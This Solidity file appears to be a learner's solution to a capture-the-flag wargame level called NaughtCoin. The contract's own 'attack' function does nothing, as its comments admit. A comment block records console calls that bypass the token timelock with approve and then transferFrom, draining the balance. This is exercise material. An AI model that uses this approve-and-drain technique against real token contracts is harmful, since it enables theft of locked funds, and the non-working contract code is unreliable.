// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin target;

    constructor(address _targetAddress) public {
        target = NaughtCoin(_targetAddress);
    }
    // my attempt at timeLock overflow/underflow attack unsuccessful, needs more work unlikely to work with this compiler
    function transfer() public payable {
        block.timestamp - 1; // did not give me the required allowance, not working, no errors
        target.transfer; // not able to enter amount to transfer after deployed but did seem like it worked, but nope
    } // console attack below, approve/transferFrom attack successful followed tuts
    /*
    (await contract.balanceOf(player)).toString()
    '1000000000000000000000000'
    (await contract.allowance(player, player)).toString()
    '0'
    (await contract.approve(player, '1000000000000000000000000')).toString()
    (await contract.allowance(player, player)).toString()
    '1000000000000000000000000'
    (await contract.transferFrom(player, '0x171Cd108e2988193Cd12763936994050c98adF30', '1000000000000000000000000')).toString()
    (await contract.balanceOf(player)).toString()
    '0'
    */
}